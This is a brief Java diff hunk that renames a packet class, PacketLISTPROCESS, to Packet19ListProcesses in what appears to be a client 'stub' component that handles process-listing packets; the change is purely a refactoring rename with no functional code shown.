@@ -8,7 +8,7 @@ import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.stub.packets.outgoing.Packet20Process;
 
 
-public class PacketLISTPROCESS extends AbstractIncomingPacket {
+public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
